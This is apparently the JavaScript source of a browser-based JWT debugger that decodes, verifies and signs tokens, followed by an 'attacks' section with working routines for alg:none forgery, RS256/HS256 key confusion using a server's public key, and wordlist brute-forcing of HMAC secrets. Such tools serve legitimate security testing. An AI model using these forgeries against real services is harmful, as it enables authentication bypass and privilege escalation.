/* Blackheart JWT debugger — decode / verify / sign, fully client-side.
 * Uses the Web Crypto API (crypto.subtle). No token or key leaves the browser. */
(function () {
  "use strict";

  var $ = function (id) { return document.getElementById(id); };
  var enc = $("jwtEncoded"), hdr = $("jwtHeader"), pay = $("jwtPayload"),
      alg = $("jwtAlg"), key = $("jwtKey"), b64 = $("jwtB64"),
      parts = $("jwtParts"), claims = $("jwtClaims"), status = $("jwtStatus"),
      keyLabel = $("jwtKeyLabel"), keyHint = $("jwtKeyHint");
  if (!enc) return;

  var td = new TextDecoder(), te = new TextEncoder();

  // ---------- base64url ----------
  function b64uToBytes(s) {
    s = String(s).replace(/-/g, "+").replace(/_/g, "/");
    while (s.length % 4) s += "=";
    var bin = atob(s), out = new Uint8Array(bin.length);
    for (var i = 0; i < bin.length; i++) out[i] = bin.charCodeAt(i);
    return out;
  }
  function bytesToB64u(bytes) {
    var bin = "", b = new Uint8Array(bytes);
    for (var i = 0; i < b.length; i++) bin += String.fromCharCode(b[i]);
    return btoa(bin).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
  }
  function strToB64u(s) { return bytesToB64u(te.encode(s)); }
  function b64uToStr(s) { return td.decode(b64uToBytes(s)); }

  function prettyJSON(s) {
    try { return JSON.stringify(JSON.parse(s), null, 2); } catch (e) { return s; }
  }

  // ---------- alg -> Web Crypto params ----------
  function hashOf(a) { return "SHA-" + a.slice(2); }             // HS256 -> SHA-256
  function family(a) { return a.slice(0, 2); }                   // HS / RS / PS / ES

  function importParams(a) {
    var f = family(a), h = hashOf(a);
    if (f === "HS") return { name: "HMAC", hash: h };
    if (f === "RS") return { name: "RSASSA-PKCS1-v1_5", hash: h };
    if (f === "PS") return { name: "RSA-PSS", hash: h };
    if (f === "ES") return { name: "ECDSA", namedCurve: a === "ES384" ? "P-384" : "P-256" };
    throw new Error("unsupported alg " + a);
  }
  function signParams(a) {
    var f = family(a);
    if (f === "PS") return { name: "RSA-PSS", saltLength: parseInt(a.slice(2), 10) / 8 };
    if (f === "ES") return { name: "ECDSA", hash: hashOf(a) };
    if (f === "RS") return { name: "RSASSA-PKCS1-v1_5" };
    return { name: "HMAC" };
  }

  function pemToBytes(pem) {
    var b = pem.replace(/-----BEGIN [^-]+-----/g, "")
               .replace(/-----END [^-]+-----/g, "")
               .replace(/\s+/g, "");
    return b64uToBytes(b.replace(/\+/g, "-").replace(/\//g, "_"));
  }

  function importKey(a, keyText, usage) {
    var f = family(a), p = importParams(a);
    if (f === "HS") {
      var raw = b64.checked ? b64uToBytes(keyText.replace(/\+/g, "-").replace(/\//g, "_"))
                            : te.encode(keyText);
      return crypto.subtle.importKey("raw", raw, p, false, [usage]);
    }
    // asymmetric: verify needs SPKI (public), sign needs PKCS8 (private)
    var isPriv = /PRIVATE KEY/.test(keyText) || usage === "sign";
    var fmt = isPriv ? "pkcs8" : "spki";
    return crypto.subtle.importKey(fmt, pemToBytes(keyText), p, false, [usage]);
  }

  // ---------- decode (live) ----------
  function setStatus(msg, cls) { status.textContent = msg || ""; status.className = "jwt-status " + (cls || ""); }

  function humanTime(v) {
    if (typeof v !== "number") return null;
    var d = new Date(v * 1000), now = Date.now() / 1000, diff = v - now;
    var rel = Math.abs(diff) < 90 ? "just now"
      : (diff > 0 ? "in " : "") + fmtDur(Math.abs(diff)) + (diff < 0 ? " ago" : "");
    return { iso: d.toISOString(), rel: rel, past: diff < 0 };
  }
  function fmtDur(s) {
    var u = [["d", 86400], ["h", 3600], ["m", 60]];
    for (var i = 0; i < u.length; i++) if (s >= u[i][1]) return Math.floor(s / u[i][1]) + u[i][0];
    return Math.floor(s) + "s";
  }

  function renderClaims(obj) {
    if (!obj || typeof obj !== "object") { claims.innerHTML = ""; return; }
    var rows = [], reg = { iat: "issued", nbf: "not before", exp: "expires" };
    Object.keys(reg).forEach(function (k) {
      if (obj[k] == null) return;
      var t = humanTime(obj[k]);
      if (!t) return;
      var cls = k === "exp" ? (t.past ? "bad" : "ok") : (k === "nbf" && !t.past ? "warn" : "");
      rows.push('<tr><td class="k">' + k + '</td><td class="v ' + cls + '">' +
        esc(t.iso) + ' <span style="opacity:.7">(' + esc(t.rel) + ')</span></td></tr>');
    });
    ["iss", "aud", "sub", "kid"].forEach(function (k) {
      if (obj[k] != null) rows.push('<tr><td class="k">' + k + '</td><td class="v">' + esc(String(obj[k])) + '</td></tr>');
    });
    claims.innerHTML = rows.length ? '<table>' + rows.join("") + '</table>' : "";
  }
  function esc(s) { return s.replace(/[&<>]/g, function (c) { return { "&": "&amp;", "<": "&lt;", ">": "&gt;" }[c]; }); }

  var syncing = false;
  function decodeFromToken() {
    var t = enc.value.trim();
    var seg = t.split(".");
    parts.innerHTML = "";
    if (t && seg.length >= 2) {
      parts.innerHTML = 'segments: <b class="h">header</b>.<b class="p">payload</b>' +
        (seg[2] ? '.<b class="s">signature</b>' : '.<i>(unsigned)</i>');
    }
    if (seg.length < 2) { return; }
    syncing = true;
    try { hdr.value = prettyJSON(b64uToStr(seg[0])); } catch (e) { hdr.value = "// header not valid base64url/JSON"; }
    var payObj = null;
    try { var ps = b64uToStr(seg[1]); pay.value = prettyJSON(ps); payObj = JSON.parse(ps); }
    catch (e) { pay.value = "// payload not valid base64url/JSON"; }
    // pull alg from header into the selector
    try { var h = JSON.parse(hdr.value); if (h && h.alg) selectAlg(h.alg); } catch (e) {}
    renderClaims(payObj);
    syncing = false;
  }

  function selectAlg(a) {
    for (var i = 0; i < alg.options.length; i++) if (alg.options[i].value === a) { alg.selectedIndex = i; break; }
    updateKeyLabel();
  }
  function updateKeyLabel() {
    var f = family(alg.value);
    if (f === "HS") { keyLabel.textContent = "Secret (HMAC)"; b64.parentNode.style.display = ""; keyHint.textContent = "HMAC uses a shared secret for both signing and verifying."; }
    else if (f === "ES") { keyLabel.textContent = "Key (EC PEM — public to verify, private to sign)"; b64.parentNode.style.display = "none"; keyHint.textContent = "Paste an SPKI public key to verify, or a PKCS#8 private key to sign."; }
    else { keyLabel.textContent = "Key (RSA PEM — public to verify, private to sign)"; b64.parentNode.style.display = "none"; keyHint.textContent = "Paste an SPKI public key to verify, or a PKCS#8 private key to sign."; }
  }

  // ---------- verify ----------
  function signingInput() {
    // rebuild header.payload from the decoded panels so edits are honoured
    var h, p;
    try { h = strToB64u(JSON.stringify(JSON.parse(hdr.value))); }
    catch (e) { h = (enc.value.split(".")[0] || ""); }
    try { p = strToB64u(JSON.stringify(JSON.parse(pay.value))); }
    catch (e) { p = (enc.value.split(".")[1] || ""); }
    return { h: h, p: p, data: te.encode(h + "." + p) };
  }

  function verify() {
    var a = alg.value, seg = enc.value.trim().split(".");
    if (seg.length < 3 || !seg[2]) { setStatus("no signature segment to verify", "bad"); return; }
    if (!key.value.trim()) { setStatus("provide a secret / key first", "bad"); return; }
    var si = { data: te.encode(seg[0] + "." + seg[1]) };
    var sig = b64uToBytes(seg[2]);
    importKey(a, key.value.trim(), "verify")
      .then(function (k) { return crypto.subtle.verify(signParams(a), k, sig, si.data); })
      .then(function (ok) { setStatus(ok ? "✓ signature valid" : "✗ signature INVALID", ok ? "ok" : "bad"); })
      .catch(function (e) { setStatus("verify error: " + e.message, "bad"); });
  }

  // ---------- sign ----------
  function sign() {
    var a = alg.value;
    if (!key.value.trim()) { setStatus("provide a secret / key first", "bad"); return; }
    // force header alg to match the selector, keep typ
    var hobj;
    try { hobj = JSON.parse(hdr.value); } catch (e) { hobj = {}; }
    hobj.alg = a; if (!hobj.typ) hobj.typ = "JWT";
    hdr.value = JSON.stringify(hobj, null, 2);
    var si = signingInput();
    importKey(a, key.value.trim(), "sign")
      .then(function (k) { return crypto.subtle.sign(signParams(a), k, si.data); })
      .then(function (sig) {
        enc.value = si.h + "." + si.p + "." + bytesToB64u(sig);
        decodeFromToken();
        setStatus("✓ token signed", "ok");
      })
      .catch(function (e) { setStatus("sign error: " + e.message, "bad"); });
  }

  // ---------- wire ----------
  enc.addEventListener("input", function () { decodeFromToken(); setStatus("", ""); });
  [hdr, pay].forEach(function (el) {
    el.addEventListener("input", function () { if (!syncing) { try { renderClaims(JSON.parse(pay.value)); } catch (e) {} setStatus("edited — click Sign to regenerate", "info"); } });
  });
  alg.addEventListener("change", updateKeyLabel);
  $("jwtVerify").addEventListener("click", verify);
  $("jwtSign").addEventListener("click", sign);

  // ---------- attacks ----------
  var atkOut = $("jwtAtkOut");
  function atk(msg, cls) { if (atkOut) { atkOut.textContent = msg || ""; atkOut.className = "jwt-status " + (cls || "info"); } }

  function headerObj() { try { return JSON.parse(hdr.value); } catch (e) { return { typ: "JWT" }; } }
  function payloadB64() { try { return strToB64u(JSON.stringify(JSON.parse(pay.value))); } catch (e) { return enc.value.split(".")[1] || ""; } }

  function algNone() {
    var p = payloadB64();
    var variants = ["none", "None", "NONE", "nOnE"];
    var toks = variants.map(function (v) { return strToB64u(JSON.stringify({ alg: v, typ: "JWT" })) + "." + p + "."; });
    enc.value = toks[0]; decodeFromToken();
    atk("alg:none forged ('none' loaded into Encoded). All case variants:\n" + toks.join("\n"), "ok");
  }

  function keyConfusion() {
    var k = key.value.trim();
    if (!/BEGIN (?:PUBLIC|RSA PUBLIC|EC) KEY|BEGIN CERTIFICATE/.test(k)) {
      atk("paste the server's PUBLIC key (PEM) into the key box first", "bad"); return;
    }
    var h = strToB64u(JSON.stringify({ alg: "HS256", typ: "JWT" })), p = payloadB64();
    var data = te.encode(h + "." + p);
    crypto.subtle.importKey("raw", te.encode(k), { name: "HMAC", hash: "SHA-256" }, false, ["sign"])
      .then(function (ck) { return crypto.subtle.sign("HMAC", ck, data); })
      .then(function (sig) {
        enc.value = h + "." + p + "." + bytesToB64u(sig); decodeFromToken();
        selectAlg("HS256"); key.value = k;
        atk("HS256 forged using the PUBLIC key as the HMAC secret.\nIf the server verifies RS256 with that key but doesn't pin the algorithm, this token passes.", "ok");
      })
      .catch(function (e) { atk("confusion error: " + e.message, "bad"); });
  }

  function bruteHS() {
    var seg = enc.value.trim().split(".");
    if (seg.length < 3 || !seg[2]) { atk("need a signed HS* token in the Encoded box", "bad"); return; }
    var a = headerObj().alg || "HS256";
    if (family(a) !== "HS") { atk("token alg is " + a + " — brute only applies to HMAC (HS*)", "bad"); return; }
    var words = $("jwtWordlist").value.split(/\r?\n/).filter(function (s) { return s.length; });
    if (!words.length) { atk("add candidate secrets (one per line)", "bad"); return; }
    var data = te.encode(seg[0] + "." + seg[1]), sig = b64uToBytes(seg[2]), i = 0, hash = hashOf(a);
    atk("brute-forcing " + words.length + " candidates\u2026", "info");
    function step() {
      if (i >= words.length) { atk("\u2717 no match in " + words.length + " candidates", "bad"); return; }
      var w = words[i++];
      crypto.subtle.importKey("raw", te.encode(w), { name: "HMAC", hash: hash }, false, ["verify"])
        .then(function (k) { return crypto.subtle.verify("HMAC", k, sig, data); })
        .then(function (ok) {
          if (ok) { key.value = w; selectAlg(a); atk("\u2713 secret found: " + JSON.stringify(w) + "  (loaded into the key box)", "ok"); }
          else step();
        })
        .catch(function (e) { atk("brute error: " + e.message, "bad"); });
    }
    step();
  }

  $("jwtAlgNone").addEventListener("click", algNone);
  $("jwtConfuse").addEventListener("click", keyConfusion);
  $("jwtBrute").addEventListener("click", bruteHS);

  // ---------- sample on load ----------
  function initSample() {
    hdr.value = JSON.stringify({ alg: "HS256", typ: "JWT" }, null, 2);
    pay.value = JSON.stringify({ sub: "1337", name: "Blackheart", role: "admin", iat: 1516239022 }, null, 2);
    key.value = "your-256-bit-secret";
    selectAlg("HS256");
    sign();  // produces a valid sample token in the Encoded box
  }
  initSample();
})();
